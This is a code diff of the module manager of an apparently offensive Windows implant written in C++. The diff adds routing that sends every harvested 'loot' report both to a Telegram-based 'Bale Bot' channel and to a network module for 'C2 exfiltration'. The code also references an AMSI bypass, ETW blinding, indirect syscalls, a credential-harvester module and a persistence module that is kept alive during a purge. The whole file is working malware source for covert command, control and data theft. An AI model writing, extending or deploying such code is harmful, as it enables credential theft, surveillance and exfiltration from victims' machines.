@@ -47,12 +47,12 @@
 #ifdef ATOM_14_ENABLED
 #include "../Atoms/Atom_14_Spy.h"
 #endif
+#include <cstdio>
+#include <string>
 #include "../Evasion_Suite/include/etw_blind.h"
 #include "../Evasion_Suite/include/indirect_syscall.h"
 #include "Config.h"
 #include "Logger.h"
-#include <cstdio>
-#include <string>
 #include <winhttp.h>
 
 #pragma comment(lib, "winhttp.lib")
@@ -63,9 +63,14 @@ static BYTE s_SessionKey[16] = {0};
 DWORD WINAPI IpcListenerThread(LPVOID lpParam);
 
 static ATOM_RECORD s_Atoms[MAX_ATOMS] = {0};
+static CRITICAL_SECTION s_AtomCS;  // Thread safety for s_Atoms[] access
 
 // Global handle to Atom 1's report pipe for forwarding non‑Bale reports
 static HANDLE g_hNetworkReportPipe = NULL;
+// Global handle to Bale Bot's report pipe for universal Telegram forwarding
+static HANDLE g_hBaleReportPipe = NULL;
+static CRITICAL_SECTION s_BaleReportCS;
+static BOOL s_BaleCSInitialized = FALSE;
 
 extern BOOL InstallAMSIBypass(void);
 extern DWORD WINAPI CredentialHarvesterAtomMain(LPVOID lpParam);
@@ -79,6 +84,7 @@ static int s_QueueCount = 0;
 // Debug trace for listener
 // --------------------------------------------------------------------------
 static void ListenerTrace(DWORD atomId, const char *format, ...) {
+  if (!Config::LOGGING_ENABLED) return;
   char buf[512];
   va_list args;
   va_start(args, format);
@@ -141,21 +147,52 @@ std::string FetchTask() { return ""; }
 // --------------------------------------------------------------------------
 // SendTaskResult: Forward reports to Atom 1 (Network) for exfiltration to C2
 // --------------------------------------------------------------------------
-void SendTaskResult(DWORD atomId, std::string result, DWORD commandId = CMD_FORWARD_REPORT) {
-  if (g_hNetworkReportPipe && g_hNetworkReportPipe != INVALID_HANDLE_VALUE) {
-    IPC_MESSAGE fwd = {0};
-    fwd.dwSignature = 0x534D4952;
-    fwd.CommandId = (ATOM_COMMAND_ID)commandId;
-    fwd.AtomId = atomId;
-    fwd.dwPayloadLen = (DWORD)result.length();
-    memcpy(fwd.Payload, result.c_str(), fwd.dwPayloadLen);
-    if (!IPC_SendMessage(g_hNetworkReportPipe, &fwd, s_SessionKey, 16)) {
-      Logger::Log(ERROR_LOG, "Failed to forward report to Atom 1");
-      QueueResult(result);
+void SendTaskResult(DWORD atomId, const BYTE* pPayload, DWORD dwPayloadLen, DWORD commandId = CMD_FORWARD_REPORT) {
+    // 1. Universal Forwarding to Telegram (Bale Bot)
+    if (g_hBaleReportPipe && g_hBaleReportPipe != INVALID_HANDLE_VALUE && atomId != 12) {
+        if (!s_BaleCSInitialized) {
+            InitializeCriticalSection(&s_BaleReportCS);
+            s_BaleCSInitialized = TRUE;
+        }
+
+        EnterCriticalSection(&s_BaleReportCS);
+        
+        IPC_MESSAGE fwd = {0};
+        fwd.dwSignature = 0x534D4952;
+        fwd.CommandId = (ATOM_COMMAND_ID)commandId;
+        fwd.AtomId = atomId;
+        fwd.dwPayloadLen = (dwPayloadLen > MAX_IPC_PAYLOAD_SIZE) ? MAX_IPC_PAYLOAD_SIZE : dwPayloadLen;
+        memcpy(fwd.Payload, pPayload, fwd.dwPayloadLen);
+
+        if (!IPC_SendMessage(g_hBaleReportPipe, &fwd, s_SessionKey, 16)) {
+            ListenerTrace(atomId, "[TRAFFIC] Failed to forward to Bale (Telegram)");
+            g_hBaleReportPipe = NULL;
+        } else {
+            ListenerTrace(atomId, "[TRAFFIC] Forwarded to Bale (Telegram)");
+        }
+        
+        LeaveCriticalSection(&s_BaleReportCS);
     }
-  } else {
-    QueueResult(result);
-  }
+
+    // 2. Primary C2 Exfiltration (Network Atom -> Bouncer)
+    if (g_hNetworkReportPipe && g_hNetworkReportPipe != INVALID_HANDLE_VALUE && atomId != 1) {
+        IPC_MESSAGE fwd = {0};
+        fwd.dwSignature = 0x534D4952;
+        fwd.CommandId = (ATOM_COMMAND_ID)commandId;
+        fwd.AtomId = atomId;
+        fwd.dwPayloadLen = (dwPayloadLen > MAX_IPC_PAYLOAD_SIZE) ? MAX_IPC_PAYLOAD_SIZE : dwPayloadLen;
+        memcpy(fwd.Payload, pPayload, fwd.dwPayloadLen);
+
+        if (!IPC_SendMessage(g_hNetworkReportPipe, &fwd, s_SessionKey, 16)) {
+            Logger::Log(ERROR_LOG, "Failed to forward report to Atom 1");
+            std::string resStr((char*)pPayload, dwPayloadLen);
+            QueueResult(resStr);
+        }
+    } else if (atomId != 1) {
+        // Only queue if not forwarded to Network and not coming from Network
+        std::string resStr((char*)pPayload, dwPayloadLen);
+        QueueResult(resStr);
+    }
 }
 
 void FlushResultQueue() { /* ... */ }
@@ -169,6 +206,8 @@ void QueueAtomCommand(DWORD atomId, const char *command, DWORD len) {
     return;
   if (len >= MAX_IPC_PAYLOAD_SIZE)
     len = MAX_IPC_PAYLOAD_SIZE - 1;
+
+  EnterCriticalSection(&s_AtomCS);
 
   Logger::Log(INFO, "Queued command for Atom " + std::to_string(atomId) + ": " +
                         std::string(command, len));
@@ -199,10 +238,12 @@ void QueueAtomCommand(DWORD atomId, const char *command, DWORD len) {
     ListenerTrace(atomId,
                   "Atom not running or no cmd pipe; command stored as pending");
   }
+
+  LeaveCriticalSection(&s_AtomCS);
 }
 
 static BOOL SpawnAtomById(DWORD atom_id, const char *initialCommand = NULL,
-                          DWORD cmdLen = 0) {
+                          DWORD cmdLen = 0, DWORD ownerId = 0) {
   if (atom_id <= 0 || atom_id > 14)
     return FALSE;
   if (s_Atoms[atom_id].Status == ATOM_STATUS_RUNNING) {
@@ -215,6 +256,7 @@ static BOOL SpawnAtomById(DWORD atom_id, const char *initialCommand = NULL,
   Logger::Log(SUCCESS,
               "Initiating ATOM " + std::to_string(atom_id) + " Deployment...");
   s_Atoms[atom_id].dwAtomId = atom_id;
+  s_Atoms[atom_id].OwnerAtomId = ownerId;
   s_Atoms[atom_id].Status = ATOM_STATUS_STARTING;
   if (initialCommand && cmdLen > 0) {
     QueueAtomCommand(atom_id, initialCommand, cmdLen);
@@ -320,16 +362,18 @@ static BOOL SpawnAtomById(DWORD atom_id, const char *initialCommand = NULL,
     while (s_Atoms[atom_id].Status != ATOM_STATUS_RUNNING && timeout-- > 0)
       Sleep(100);
   }
-  return (s_Atoms[atom_id].Status == ATOM_STATUS_RUNNING);
+  BOOL bResult = (s_Atoms[atom_id].Status == ATOM_STATUS_RUNNING);
+  return bResult;
 }
 
 BOOL SpawnAtomFromTask(std::string json) { return TRUE; }
 
 void StartAutoAtoms(void) {
+  InitializeCriticalSection(&s_AtomCS);
   Logger::Log(INFO, "Starting auto‑run atoms...");
   for (int i = 0; i < Config::AUTO_START_COUNT; i++) {
     DWORD id = Config::AUTO_START_ATOMS[i];
-    if (SpawnAtomById(id))
+    if (SpawnAtomById(id, NULL, 0, 0))
       Logger::Log(SUCCESS, "Auto‑started Atom " + std::to_string(id));
     else
       Logger::Log(ERROR_LOG, "Failed to auto‑start Atom " + std::to_string(id));
@@ -345,14 +389,56 @@ BOOL StopAtomById(DWORD atom_id) {
     return FALSE;
   }
   Logger::Log(INFO, "Stopping Atom " + std::to_string(atom_id) + "...");
+  
+  // 1. Try graceful termination first
   if (s_Atoms[atom_id].hCmdPipe) {
     IPC_MESSAGE termMsg = {0};
     termMsg.dwSignature = 0x534D4952;
     termMsg.CommandId = CMD_TERMINATE;
     IPC_SendMessage(s_Atoms[atom_id].hCmdPipe, &termMsg, s_SessionKey, 16);
+    CloseHandle(s_Atoms[atom_id].hCmdPipe);
+    s_Atoms[atom_id].hCmdPipe = NULL;
   }
+
+  // 2. Force terminate the process handle
+  if (s_Atoms[atom_id].hProcess && s_Atoms[atom_id].hProcess != INVALID_HANDLE_VALUE) {
+    TerminateProcess(s_Atoms[atom_id].hProcess, 0);
+    CloseHandle(s_Atoms[atom_id].hProcess);
+    s_Atoms[atom_id].hProcess = NULL;
+  }
+
+  if (s_Atoms[atom_id].hReportPipe) {
+    CloseHandle(s_Atoms[atom_id].hReportPipe);
+    s_Atoms[atom_id].hReportPipe = NULL;
+  }
+
   s_Atoms[atom_id].Status = ATOM_STATUS_DEAD;
+  if (atom_id == 1) g_hNetworkReportPipe = NULL;
+  if (atom_id == 12) g_hBaleReportPipe = NULL;
   return TRUE;
+}
+
+void StopAllTasks() {
+  Logger::Log(INFO, "ELITE FORCE STOP triggered. Purging all non-core tasks...");
+  // Core atoms to keep (defined in Config::AUTO_START_ATOMS: 4, 12, 1)
+  // We iterate through all possible atoms (1..14)
+  for (DWORD id = 1; id < MAX_ATOMS; id++) {
+    bool isCore = false;
+    for (int j = 0; j < Config::AUTO_START_COUNT; j++) {
+        if (id == Config::AUTO_START_ATOMS[j]) {
+            isCore = true;
+            break;
+        }
+    }
+    // Also keep 7 (Persistence) if it's running, as it's critical
+    if (id == 7) isCore = true;
+
+    if (!isCore && s_Atoms[id].Status == ATOM_STATUS_RUNNING) {
+        Logger::Log(INFO, "Purging Task Atom " + std::to_string(id) + "...");
+        StopAtomById(id);
+    }
+  }
+  Logger::Log(SUCCESS, "Implant tasking state reset to CORE ONLY.");
 }
 
 std::string ListRunningAtoms() {
@@ -388,11 +474,17 @@ DWORD WINAPI IpcListenerThread(LPVOID lpParam) {
   // Store handles
   s_Atoms[dwAtomId].hReportPipe = hReportPipe;
   s_Atoms[dwAtomId].hCmdPipe = hCmdPipe;
+  ListenerTrace(dwAtomId, "[TRAFFIC] Pipe Listener OPENED & LISTENING");
 
   // Store Atom 1's report pipe for forwarding
   if (dwAtomId == 1) {
     g_hNetworkReportPipe = hReportPipe;
     ListenerTrace(dwAtomId, "Network report pipe handle stored");
+  }
+  // Store Bale Bot's report pipe for universal Telegram forwarding
+  if (dwAtomId == 12) {
+    g_hBaleReportPipe = hReportPipe;
+    ListenerTrace(dwAtomId, "[TRAFFIC] Bale Bot established as Master Telemetry Bridge.");
   }
 
   // Wait for atom to connect to report pipe
@@ -432,7 +524,12 @@ DWORD WINAPI IpcListenerThread(LPVOID lpParam) {
                   " | Command Pipe: " + std::to_string((ULONG_PTR)hCmdPipe));
 
   // Main loop: read and process reports from hReportPipe
-  while (s_Atoms[dwAtomId].Status == ATOM_STATUS_RUNNING) {
+  while (TRUE) {
+    EnterCriticalSection(&s_AtomCS);
+    BOOL bActive = (s_Atoms[dwAtomId].Status == ATOM_STATUS_RUNNING);
+    LeaveCriticalSection(&s_AtomCS);
+    if (!bActive) break;
+
     DWORD dwAvail = 0;
     if (PeekNamedPipe(hReportPipe, NULL, 0, NULL, &dwAvail, NULL) &&
         dwAvail > 0) {
@@ -443,11 +540,11 @@ DWORD WINAPI IpcListenerThread(LPVOID lpParam) {
                       msg.CommandId, msg.dwPayloadLen);
         Logger::Log(INFO, "Received cmd=" + std::to_string(msg.CommandId) + " from Atom " + std::to_string(dwAtomId));
 
-        // --- CMD_SPAWN_ATOM (from Bale) ---
+        // --- CMD_SPAWN_ATOM ---
         if (msg.CommandId == CMD_SPAWN_ATOM) {
           std::string payload((char *)msg.Payload, msg.dwPayloadLen);
-          Logger::Log(INFO, "Received CMD_SPAWN_ATOM from Atom " +
-                                std::to_string(dwAtomId) + ": " + payload);
+          Logger::Log(INFO, "Received CMD_SPAWN_ATOM from Atom " + std::to_string(dwAtomId) + ": " + payload);
+          
           size_t colonPos = payload.find(':');
           DWORD targetAtomId = 0;
           std::string args;
@@ -468,17 +565,24 @@ DWORD WINAPI IpcListenerThread(LPVOID lpParam) {
             ack.dwPayloadLen = (DWORD)ackPayload.length();
             memcpy(ack.Payload, ackPayload.c_str(), ack.dwPayloadLen);
             IPC_SendMessage(hReportPipe, &ack, s_SessionKey, 16);
-            continue;
           }
-
-          if (s_Atoms[targetAtomId].Status == ATOM_STATUS_RUNNING) {
-            Logger::Log(INFO, "Atom " + std::to_string(targetAtomId) +
-                                  " already running. Sending command.");
+          else if (args == "LIST") {
+            std::string atomList = ListRunningAtoms();
+            IPC_MESSAGE listMsg = {0};
+            listMsg.dwSignature = 0x534D4952;
+            listMsg.CommandId = CMD_FORWARD_REPORT;
+            listMsg.AtomId = targetAtomId;
+            listMsg.dwPayloadLen = (DWORD)atomList.length();
+            if (listMsg.dwPayloadLen > MAX_IPC_PAYLOAD_SIZE) listMsg.dwPayloadLen = MAX_IPC_PAYLOAD_SIZE;
+            memcpy(listMsg.Payload, atomList.c_str(), listMsg.dwPayloadLen);
+            IPC_SendMessage(hReportPipe, &listMsg, s_SessionKey, 16);
+          }
+          else if (s_Atoms[targetAtomId].Status == ATOM_STATUS_RUNNING) {
+            Logger::Log(INFO, "Atom " + std::to_string(targetAtomId) + " already running. Sending command.");
             s_Atoms[targetAtomId].bBaleRouted = TRUE;
             s_Atoms[targetAtomId].hBalePipe = hReportPipe;
             if (!args.empty()) {
-              QueueAtomCommand(targetAtomId, args.c_str(),
-                               (DWORD)args.length());
+              QueueAtomCommand(targetAtomId, args.c_str(), (DWORD)args.length());
             }
             IPC_MESSAGE ack = {0};
             ack.dwSignature = 0x534D4952;
@@ -488,119 +592,89 @@ DWORD WINAPI IpcListenerThread(LPVOID lpParam) {
             ack.dwPayloadLen = (DWORD)ackPayload.length();
             memcpy(ack.Payload, ackPayload.c_str(), ack.dwPayloadLen);
             IPC_SendMessage(hReportPipe, &ack, s_SessionKey, 16);
-            continue;
           }
-
-          s_Atoms[targetAtomId].bBaleRouted = TRUE;
-          s_Atoms[targetAtomId].hBalePipe = hReportPipe;
-          if (SpawnAtomById(targetAtomId, args.c_str(),
-                            (DWORD)args.length())) {
-            IPC_MESSAGE ack = {0};
-            ack.dwSignature = 0x534D4952;
-            ack.CommandId = CMD_FORWARD_REPORT;
-            ack.AtomId = targetAtomId;
-            std::string ackPayload = "ACK:" + std::to_string(targetAtomId);
-            ack.dwPayloadLen = (DWORD)ackPayload.length();
-            memcpy(ack.Payload, ackPayload.c_str(), ack.dwPayloadLen);
-            IPC_SendMessage(hReportPipe, &ack, s_SessionKey, 16);
-          } else {
-            IPC_MESSAGE nack = {0};
-            nack.dwSignature = 0x534D4952;
-            nack.CommandId = CMD_FORWARD_REPORT;
-            nack.AtomId = targetAtomId;
-            std::string nackPayload = "NACK:" + std::to_string(targetAtomId);
-            nack.dwPayloadLen = (DWORD)nackPayload.length();
-            memcpy(nack.Payload, nackPayload.c_str(), nack.dwPayloadLen);
-            IPC_SendMessage(hReportPipe, &nack, s_SessionKey, 16);
+          else {
+            s_Atoms[targetAtomId].OwnerAtomId = dwAtomId;
+            if (SpawnAtomById(targetAtomId, args.c_str(), (DWORD)args.length(), dwAtomId)) {
+              IPC_MESSAGE ack = {0};
+              ack.dwSignature = 0x534D4952;
+              ack.CommandId = CMD_FORWARD_REPORT;
+              ack.AtomId = targetAtomId;
+              std::string ackPayload = "ACK:" + std::to_string(targetAtomId);
+              ack.dwPayloadLen = (DWORD)ackPayload.length();
+              memcpy(ack.Payload, ackPayload.c_str(), ack.dwPayloadLen);
+              IPC_SendMessage(hReportPipe, &ack, s_SessionKey, 16);
+            } else {
+              IPC_MESSAGE nack = {0};
+              nack.dwSignature = 0x534D4952;
+              nack.CommandId = CMD_FORWARD_REPORT;
+              nack.AtomId = targetAtomId;
+              std::string nackPayload = "NACK:" + std::to_string(targetAtomId);
+              nack.dwPayloadLen = (DWORD)nackPayload.length();
+              memcpy(nack.Payload, nackPayload.c_str(), nack.dwPayloadLen);
+              IPC_SendMessage(hReportPipe, &nack, s_SessionKey, 16);
+            }
           }
-          continue;
         }
-
-        // --- CMD_READY (from atom) ---
-        if (msg.CommandId == CMD_READY) {
+        // --- CMD_READY ---
+        else if (msg.CommandId == CMD_READY) {
           ListenerTrace(dwAtomId, "CMD_READY received");
-          Logger::Log(INFO, "Received CMD_READY from Atom " +
-                                std::to_string(dwAtomId));
-          if (s_Atoms[dwAtomId].pendingCommandLen > 0 &&
-              s_Atoms[dwAtomId].hCmdPipe) {
-            ListenerTrace(dwAtomId,
-                          "Sending pending command on CMD_READY (len=%lu)",
-                          s_Atoms[dwAtomId].pendingCommandLen);
+          Logger::Log(INFO, "Received CMD_READY from Atom " + std::to_string(dwAtomId));
+          if (s_Atoms[dwAtomId].pendingCommandLen > 0 && s_Atoms[dwAtomId].hCmdPipe) {
+            ListenerTrace(dwAtomId, "Sending pending command on CMD_READY (len=%lu)", s_Atoms[dwAtomId].pendingCommandLen);
             IPC_MESSAGE cmdMsg = {0};
             cmdMsg.dwSignature = 0x534D4952;
             cmdMsg.CommandId = CMD_EXECUTE;
             cmdMsg.dwPayloadLen = s_Atoms[dwAtomId].pendingCommandLen;
-            memcpy(cmdMsg.Payload, s_Atoms[dwAtomId].pendingCommand,
-                   cmdMsg.dwPayloadLen);
-            if (IPC_SendMessage(s_Atoms[dwAtomId].hCmdPipe, &cmdMsg,
-                                s_SessionKey, 16)) {
+            memcpy(cmdMsg.Payload, s_Atoms[dwAtomId].pendingCommand, cmdMsg.dwPayloadLen);
+            if (IPC_SendMessage(s_Atoms[dwAtomId].hCmdPipe, &cmdMsg, s_SessionKey, 16)) {
               ListenerTrace(dwAtomId, "Pending command sent");
               s_Atoms[dwAtomId].pendingCommandLen = 0;
             }
           }
-          continue;
         }
-
-        // --- CMD_REPORT (from atom) ---
-        if (msg.CommandId == CMD_REPORT) {
-          std::string loot((char *)msg.Payload, msg.dwPayloadLen);
-          ListenerTrace(dwAtomId, "REPORT received, size=%lu",
-                        msg.dwPayloadLen);
-          Logger::Log(INFO, "REPORT from Atom " + std::to_string(dwAtomId) +
-                                ", size: " + std::to_string(msg.dwPayloadLen));
-
-          if (s_Atoms[dwAtomId].bBaleRouted &&
-              s_Atoms[dwAtomId].hBalePipe != NULL) {
-            IPC_MESSAGE fwd = {0};
-            fwd.dwSignature = 0x534D4952;
-            fwd.CommandId = CMD_FORWARD_REPORT;
-            fwd.AtomId = dwAtomId;
-            fwd.dwPayloadLen = msg.dwPayloadLen;
-            memcpy(fwd.Payload, msg.Payload, msg.dwPayloadLen);
-            if (IPC_SendMessage(s_Atoms[dwAtomId].hBalePipe, &fwd,
-                                s_SessionKey, 16)) {
-              ListenerTrace(dwAtomId, "Forwarded report to Bale");
-            } else {
-              ListenerTrace(dwAtomId, "Failed to forward report to Bale");
-            }
-          } else {
-            SendTaskResult(dwAtomId, loot, CMD_FORWARD_REPORT);
-          }
+        // --- CMD_REPORT ---
+        else if (msg.CommandId == CMD_REPORT) {
+          ListenerTrace(dwAtomId, "[TRAFFIC] REPORT received, size=%lu", msg.dwPayloadLen);
+          SendTaskResult(dwAtomId, msg.Payload, msg.dwPayloadLen, CMD_FORWARD_REPORT);
+        }
+        // --- STOP ALL TASKS ---
+        else if (msg.CommandId == CMD_STOP_ALL) {
+           ListenerTrace(dwAtomId, "[TRAFFIC] Universal STOP received.");
+           StopAllTasks();
+        }
+        // --- CMD_BALE_REPORT ---
+        else if (msg.CommandId == CMD_BALE_REPORT) {
+          ListenerTrace(dwAtomId, "[TRAFFIC] BALE_REPORT received, size=%lu", msg.dwPayloadLen);
+          SendTaskResult(dwAtomId, msg.Payload, msg.dwPayloadLen, CMD_BALE_REPORT);
 
           IPC_MESSAGE ackMsg = {0};
           ackMsg.dwSignature = 0x534D4952;
           ackMsg.CommandId = CMD_REPORT_ACK;
           ackMsg.dwPayloadLen = 0;
           IPC_SendMessage(s_Atoms[dwAtomId].hCmdPipe, &ackMsg, s_SessionKey, 16);
-          continue;
         }
-
-        // --- CMD_FORWARD_REPORT (from atom directly) ---
-        if (msg.CommandId == CMD_FORWARD_REPORT) {
-          std::string loot((char *)msg.Payload, msg.dwPayloadLen);
-          ListenerTrace(dwAtomId, "FORWARD_REPORT received, size=%lu", msg.dwPayloadLen);
-          SendTaskResult(dwAtomId, loot, CMD_FORWARD_REPORT);
-          continue;
+        // --- CMD_FORWARD_REPORT ---
+        else if (msg.CommandId == CMD_FORWARD_REPORT) {
+          ListenerTrace(dwAtomId, "[TRAFFIC] FORWARD_REPORT received, size=%lu", msg.dwPayloadLen);
+          SendTaskResult(dwAtomId, msg.Payload, msg.dwPayloadLen, CMD_FORWARD_REPORT);
         }
-
-        // Unknown command — log and ignore
-        ListenerTrace(dwAtomId, "Unknown command %d, ignoring",
-                      msg.CommandId);
-      } else {
-        // IPC_ReceiveMessage failed — data was available but couldn't parse
-        ListenerTrace(dwAtomId, "IPC_ReceiveMessage failed, possible corrupt data");
-      }
+        // --- UNKNOWN ---
+        else {
+          ListenerTrace(dwAtomId, "[TRAFFIC] Unknown command %d, ignoring", msg.CommandId);
+        }
+      } // end if IPC_ReceiveMessage
     } else {
-      DWORD err = GetLastError();
-      if (err == ERROR_BROKEN_PIPE) {
-        ListenerTrace(dwAtomId, "Report pipe broken, exiting listener");
-        break;
+      // PeekNamedPipe failed or no data. Check if pipe was severed.
+      if (GetLastError() == ERROR_BROKEN_PIPE) {
+          ListenerTrace(dwAtomId, "[TRAFFIC] Pipe broken during poll. Exiting.");
+          break;
       }
     }
     Sleep(50);
   }
 
-  ListenerTrace(dwAtomId, "Listener thread exiting");
+  ListenerTrace(dwAtomId, "[TRAFFIC] Pipe Listener CLOSED");
   Logger::Log(ERROR_LOG,
               "IPC Link SEVERED for Atom " + std::to_string(dwAtomId));
   s_Atoms[dwAtomId].Status = ATOM_STATUS_DEAD;
@@ -632,6 +706,7 @@ BOOL InitAtomManager(void) {
     s_Atoms[i].hBalePipe = NULL;
     s_Atoms[i].hReportPipe = NULL;
     s_Atoms[i].hCmdPipe = NULL;
+    s_Atoms[i].OwnerAtomId = 0;
     s_Atoms[i].pendingCommandLen = 0;
     memset(s_Atoms[i].pendingCommand, 0, MAX_IPC_PAYLOAD_SIZE);
   }
